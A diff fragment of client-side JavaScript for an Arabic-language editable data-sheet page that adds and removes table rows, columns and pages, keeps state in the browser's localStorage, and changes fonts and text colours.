+            let archives = JSON.parse(localStorage.getItem('toufan_my_works_archive') || '[]');
+            archives = archives.filter(item => item.id !== id);
+            localStorage.setItem('toufan_my_works_archive', JSON.stringify(archives));
+            openArchiveModal();
+        }
+
+        function resetAllData() {
+            if (confirm('مسح الصفحة والبدء من جديد؟')) {
+                localStorage.removeItem('toufan_live_table_data');
+                location.reload();
+            }
+        }
+
+        function addRowToActiveTable() {
+            if (!activeTable) {
+                const firstSheet = document.querySelector('.sheet-container');
+                activeTable = firstSheet.querySelector('table');
+            }
+            if (!activeTable) return;
+
+            const tbody = activeTable.querySelector('tbody');
+            const newRow = tbody.insertRow();
+            newRow.setAttribute('onclick', 'selectRow(this,event)');
+
+            const cellM = newRow.insertCell();
+            cellM.textContent = '-';
+
+            const colCount = activeTable.querySelectorAll('thead th').length - 1;
+            for (let c = 0; c < colCount; c++) {
+                const cell = newRow.insertCell();
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.className = 'table-input';
+                input.onfocus = function() { setActiveInput(this); };
+                input.oninput = function() { 
+                    this.setAttribute('value', this.value);
+                    saveCurrentStateToLocalStorage(); 
+                };
+                cell.appendChild(input);
+            }
+            renumberAllRows();
+            saveCurrentStateToLocalStorage();
+        }
+
+        function addColumnToActiveTable() {
+            if (!activeTable) {
+                const firstSheet = document.querySelector('.sheet-container');
+                activeTable = firstSheet.querySelector('table');
+            }
+            if (!activeTable) return;
+
+            const headerRow = activeTable.querySelector('thead tr');
+            const th = document.createElement('th');
+            th.style.width = '80px';
+            th.setAttribute('contenteditable', 'true');
+            th.textContent = 'جديد';
+            th.oninput = function() { saveCurrentStateToLocalStorage(); };
+            headerRow.appendChild(th);
+
+            const tbody = activeTable.querySelector('tbody');
+            Array.from(tbody.rows).forEach(row => {
+                const td = row.insertCell();
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.className = 'table-input';
+                input.onfocus = function() { setActiveInput(this); };
+                input.oninput = function() { 
+                    this.setAttribute('value', this.value);
+                    saveCurrentStateToLocalStorage(); 
+                };
+                td.appendChild(input);
+            });
+            saveCurrentStateToLocalStorage();
+        }
+
+        function deleteSelectedRow() {
+            if (!activeRowElement) return;
+            const tbody = activeRowElement.parentElement;
+            if (tbody.rows.length > 1) {
+                activeRowElement.remove();
+                activeRowElement = null;
+                activeInputElement = null;
+                renumberAllRows();
+                saveCurrentStateToLocalStorage();
+            }
+        }
+
+        function deleteSelectedColumn() {
+            if (!activeTable) return;
+            const headerRow = activeTable.querySelector('thead tr');
+            if (headerRow.cells.length <= 2) return;
+
+            let index = headerRow.cells.length - 1;
+            headerRow.deleteCell(index);
+            const tbody = activeTable.querySelector('tbody');
+            Array.from(tbody.rows).forEach(row => {
+                if (row.cells[index]) row.deleteCell(index);
+            });
+            saveCurrentStateToLocalStorage();
+        }
+
+        function deleteActivePage() {
+            const pages = document.querySelectorAll('.sheet-container');
+            if (pages.length <= 1) return;
+            if (!confirm('حذف هذه الصفحة؟')) return;
+
+            if (activeSheet && activeSheet.isConnected) {
+                activeSheet.remove();
+            } else {
+                pages[pages.length - 1].remove();
+            }
+            renumberAllRows();
+            saveCurrentStateToLocalStorage();
+        }
+
+        function addNewPage() {
+            const wrapper = document.getElementById('pagesWrapper');
+            const pageCount = wrapper.querySelectorAll('.sheet-container').length + 1;
+
+            const newPage = document.createElement('div');
+            newPage.className = 'sheet-container';
+            newPage.setAttribute('onclick', 'setActiveContext(this,event)');
+
+            newPage.innerHTML = `
+                <div class="header-top">
+                    <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
+                    <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة ${pageCount})</div>
+                    <div class="editable-header" contenteditable="true">التاريخ: ---</div>
+                </div>
+                <div class="table-wrapper">
+                    <table class="dynamicTable">
+                        <thead>
+                            <tr>
+                                <th style="width:35px;">م</th>
+                                <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الاسم الرباعي</th>
+                                <th style="width:80px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">نوع البطاقة</th>
+                                <th style="width:100px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم البطاقة</th>
+                                <th style="width:90px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم الاتصال</th>
+                                <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">اسم الزوجة / الزوج</th>
+                                <th style="width:70px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الحالة</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            ${Array.from({length:15}, () => `
+                                <tr onclick="selectRow(this,event)">
+                                    <td>-</td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                    <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
+                                </tr>
+                            `).join('')}
+                        </tbody>
+                    </table>
+                </div>
+                <div class="footer-bottom">
+                    <div class="editable-header" contenteditable="true">الإدارة العامة</div>
+                    <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
+                </div>
+            `;
+
+            wrapper.appendChild(newPage);
+            renumberAllRows();
+            rebindInputs();
+            saveCurrentStateToLocalStorage();
+        }
+
+        function changeFontFamily(fontValue) {
+            document.body.style.fontFamily = fontValue;
+            document.querySelectorAll('.btn, select, input').forEach(el => { el.style.fontFamily = fontValue; });
+        }
+
+        function changeTextColor(colorValue) {
+            document.querySelectorAll('.sheet-container, .sheet-container th, .table-input, .editable-header').forEach(el => { el.style.color = colorValue; });
+        }
+    </script>
 </body>
 </html>
